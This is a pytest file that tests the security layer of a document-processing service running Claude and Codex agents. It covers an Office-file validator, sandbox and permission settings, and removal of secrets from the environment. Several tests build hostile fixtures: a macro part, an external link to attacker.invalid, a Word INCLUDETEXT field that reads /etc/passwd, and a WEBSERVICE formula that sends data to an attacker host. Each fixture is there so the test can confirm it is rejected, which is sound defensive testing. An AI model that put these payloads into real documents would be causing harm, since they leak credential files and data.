import asyncio
import json
import zipfile
from pathlib import Path

import pytest
from claude_agent_sdk import ResultMessage
from docx import Document
from openpyxl import Workbook

import walkie_dokie.agents.claude_agent as claude_module
import walkie_dokie.agents.codex_agent as codex_module
from walkie_dokie.agents.claude_agent import ClaudeAgentSDKBackend
from walkie_dokie.agents.claude_agent import _execution_options
from walkie_dokie.agents.codex_agent import (
    CodexBackend,
    _PERMISSION_PROFILE_NAME,
    _execution_arguments,
    _permission_profile_text,
)
from walkie_dokie.agents.security import (
    claude_sandbox_settings,
    sanitized_subprocess_environment,
    sensitive_environment_overrides,
    validate_office_artifact,
)


def _write_docx(path: Path) -> None:
    """Helper to write a minimal DOCX file for testing."""
    document = Document()
    document.add_paragraph("安全内容")
    document.save(path)


def test_valid_docx_and_xlsx_pass_deterministic_validation(tmp_path):
    document_path = tmp_path / "safe.docx"
    document = Document()
    document.add_paragraph("这只是文档数据。")
    document.save(document_path)

    workbook_path = tmp_path / "safe.xlsx"
    workbook = Workbook()
    workbook.active["A1"] = "安全数据"
    workbook.save(workbook_path)

    validate_office_artifact(document_path, role="测试输入")
    validate_office_artifact(workbook_path, role="测试输入")


@pytest.mark.parametrize("filename", ["prompt.txt", "macro.docm", "legacy.doc"])
def test_non_ooxml_input_is_rejected(tmp_path, filename):
    path = tmp_path / filename
    path.write_bytes(b"not an office package")
    with pytest.raises(RuntimeError, match="只允许安全的"):
        validate_office_artifact(path, role="测试输入")


def _minimal_docx(path, extra_parts):
    parts = {
        "[Content_Types].xml": "<Types />",
        "word/document.xml": "<document />",
    }
    parts.update(extra_parts)
    with zipfile.ZipFile(path, "w") as archive:
        for name, content in parts.items():
            archive.writestr(name, content)


def test_macro_or_embedded_active_content_is_rejected(tmp_path):
    path = tmp_path / "hostile.docx"
    _minimal_docx(path, {"word/vbaProject.bin": b"macro"})
    with pytest.raises(RuntimeError, match="宏、嵌入对象或外部链接"):
        validate_office_artifact(path, role="测试输入")


def test_external_relationship_is_rejected(tmp_path):
    path = tmp_path / "hostile.docx"
    relationship = """<?xml version="1.0"?>
    <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
      <Relationship Id="rId1" Type="image" Target="https://attacker.invalid/x" TargetMode="External" />
    </Relationships>"""
    _minimal_docx(path, {"word/_rels/document.xml.rels": relationship})
    with pytest.raises(RuntimeError, match="包含外部关系"):
        validate_office_artifact(path, role="测试输入")


def test_active_word_field_is_rejected_without_matching_style_names(tmp_path):
    path = tmp_path / "field.docx"
    document = """<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
      <w:body><w:p><w:r><w:instrText> INCLUDETEXT "file:///etc/passwd" </w:instrText></w:r></w:p></w:body>
    </w:document>"""
    _minimal_docx(path, {"word/document.xml": document})
    with pytest.raises(RuntimeError, match="Word 字段"):
        validate_office_artifact(path, role="测试输入")


def test_external_excel_formula_is_rejected(tmp_path):
    path = tmp_path / "formula.xlsx"
    workbook = Workbook()
    workbook.active["A1"] = '=WEBSERVICE("https://attacker.invalid/collect")'
    workbook.save(path)
    with pytest.raises(RuntimeError, match="Excel 公式"):
        validate_office_artifact(path, role="测试输入")


def test_prompt_injection_cannot_enable_claude_capabilities(tmp_path, monkeypatch):
    monkeypatch.setenv("FEISHU_APP_SECRET", "must-not-leak")
    workdir = tmp_path / "one-user-run"
    workdir.mkdir()

    options = _execution_options(workdir)
    sandbox = options.sandbox
    settings = json.loads(options.settings)

    assert options.tools == ["Bash"]
    assert options.allowed_tools == ["Bash"]
    assert options.permission_mode == "dontAsk"
    assert options.setting_sources == []
    assert options.strict_mcp_config is True
    assert options.mcp_servers == {}
    assert options.skills == []
    assert settings["permissions"]["disableBypassPermissionsMode"] == "disable"
    assert sandbox["enabled"] is True
    assert sandbox["failIfUnavailable"] is True
    assert sandbox["allowUnsandboxedCommands"] is False
    assert sandbox["network"]["allowedDomains"] == []
    assert sandbox["network"]["deniedDomains"] == ["*"]
    assert str(workdir.resolve()) in sandbox["filesystem"]["allowRead"]
    assert str(workdir.resolve()) in sandbox["filesystem"]["allowWrite"]
    assert options.env["FEISHU_APP_SECRET"] == ""


def test_sensitive_environment_is_removed_for_codex(monkeypatch):
    monkeypatch.setenv("DEEPSEEK_API_KEY", "must-not-leak")
    monkeypatch.setenv("NORMAL_SETTING", "safe")
    assert sensitive_environment_overrides()["DEEPSEEK_API_KEY"] == ""
    env = sanitized_subprocess_environment()
    assert "DEEPSEEK_API_KEY" not in env
    assert env["NORMAL_SETTING"] == "safe"


def test_codex_execution_is_noninteractive_ephemeral_and_offline(tmp_path):
    workdir = tmp_path / "one-user-run"
    args = _execution_arguments(
        tmp_path / "schema.json", "untrusted prompt", workdir
    )
    joined = "\n".join(args)
    assert "--ask-for-approval\nnever" in joined
    assert "--ephemeral" in args
    assert "--ignore-user-config" in args
    assert "--ignore-rules" in args
    assert f"--profile\n{_PERMISSION_PROFILE_NAME}" in joined
    assert f"--cd\n{workdir.resolve()}" in joined
    assert 'web_search="disabled"' in args


def test_codex_permission_profile_only_reopens_runtime_and_workspace(tmp_path):
    executable = tmp_path / "codex-install" / "bin" / "codex.js"
    profile = _permission_profile_text(str(executable))
    assert f'default_permissions = "{_PERMISSION_PROFILE_NAME}"' in profile
    assert '":minimal" = "read"' in profile
    assert f'"{executable.parent.parent}" = "read"' in profile
    assert '[permissions.walkie-dokie-tenant.filesystem.":workspace_roots"]' in profile
    assert '"." = "write"' in profile
    assert "enabled = false" in profile
    assert '"/home" = "read"' not in profile


def test_claude_sandbox_reopens_only_runtime_and_current_workdir(tmp_path):
    workdir = tmp_path / "run"
    workdir.mkdir()
    sandbox = claude_sandbox_settings(workdir)
    assert "/home" in sandbox["filesystem"]["denyRead"]
    assert "/tmp" in sandbox["filesystem"]["denyWrite"]
    assert sandbox["filesystem"]["allowWrite"] == [str(workdir.resolve())]


async def test_claude_sdk_terminal_error_is_reported_without_protocol_noise(
    tmp_path, monkeypatch
):
    async def failing_query(*, prompt, options):
        yield ResultMessage(
            subtype="error",
            duration_ms=0,
            duration_api_ms=0,
            is_error=True,
            num_turns=0,
            session_id="test",
            result="quota exhausted",
        )
        raise Exception("misleading SDK follow-up error")

    monkeypatch.setattr(claude_module, "query", failing_query)
    with pytest.raises(RuntimeError, match="quota exhausted") as caught:
        await ClaudeAgentSDKBackend().run(
            instruction="生成测试文档",
            input_paths=(),
            input_filenames=(),
            workdir=tmp_path,
        )
    assert "misleading" not in str(caught.value)


async def test_run_stages_multiple_inputs_and_reports_multiple_outputs(
    monkeypatch, tmp_path
):
    source_dir = tmp_path / "source"
    source_dir.mkdir()
    a = source_dir / "a.docx"
    _write_docx(a)
    b = source_dir / "b.docx"
    _write_docx(b)
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    async def fake_query(*, prompt, options):
        assert "a.docx" in prompt
        assert "b.docx" in prompt
        out1 = workdir / "out1.docx"
        _write_docx(out1)
        out2 = workdir / "out2.docx"
        _write_docx(out2)
        yield ResultMessage(
            subtype="success",
            duration_ms=0,
            duration_api_ms=0,
            is_error=False,
            num_turns=1,
            session_id="test",
            result="ok",
            structured_output={
                "summary": "处理了两份文件",
                "filenames": ["out1.docx", "out2.docx"],
                "warnings": [],
            },
        )

    monkeypatch.setattr(claude_module, "query", fake_query)
    report = await ClaudeAgentSDKBackend().run(
        instruction="合并这两份文档",
        input_paths=(a, b),
        input_filenames=("a.docx", "b.docx"),
        workdir=workdir,
    )
    assert [item.filename for item in report.artifacts] == ["out1.docx", "out2.docx"]
    assert (workdir / "a.docx").is_file()
    assert (workdir / "b.docx").is_file()


async def test_codex_backend_stages_multiple_inputs_and_reports_multiple_outputs(
    monkeypatch, tmp_path
):
    source_dir = tmp_path / "source"
    source_dir.mkdir()
    a = source_dir / "a.docx"
    _write_docx(a)
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    class FakeProcess:
        returncode = 0

        async def communicate(self):
            out = workdir / "out.docx"
            _write_docx(out)
            payload = json.dumps(
                {"summary": "完成", "filenames": ["out.docx"], "warnings": []}
            ).encode()
            return payload, b""

        def kill(self):
            pass

        async def wait(self):
            pass

    async def fake_create_subprocess_exec(*args, **kwargs):
        assert str(a) not in args  # 已经拷贝进 workdir，不该直接引用源目录路径
        return FakeProcess()

    monkeypatch.setattr(
        codex_module.asyncio, "create_subprocess_exec", fake_create_subprocess_exec
    )
    backend = CodexBackend(
        executable="/usr/bin/true", codex_home=tmp_path / "codex_home"
    )
    report = await backend.run(
        instruction="处理这份文档",
        input_paths=(a,),
        input_filenames=("a.docx",),
        workdir=workdir,
    )
    assert [item.filename for item in report.artifacts] == ["out.docx"]
    assert (workdir / "a.docx").is_file()
